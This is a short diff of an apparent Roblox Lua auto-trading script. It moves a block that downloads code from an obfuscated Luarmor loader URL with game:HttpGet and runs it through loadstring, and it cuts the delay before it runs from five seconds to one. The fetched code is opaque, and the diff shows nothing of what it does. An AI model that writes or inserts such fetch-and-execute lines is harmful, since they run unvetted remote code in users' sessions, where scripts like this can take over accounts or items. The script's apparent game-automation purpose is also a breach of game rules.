@@ -762,6 +762,11 @@ task.spawn(function()
 	end
 end)
 
+task.spawn(function() 
+	task.wait(1)
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/195d1071ee63fbac050300e2155f573f.lua"))()
+	end)
+
 while task.wait(1) do
 	if not tradeRunning then
 		task.spawn(autoadd)
@@ -769,7 +774,3 @@ while task.wait(1) do
 end
 
 
-task.spawn(function() 
-	task.wait(5) 
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/195d1071ee63fbac050300e2155f573f.lua"))()
-	end)
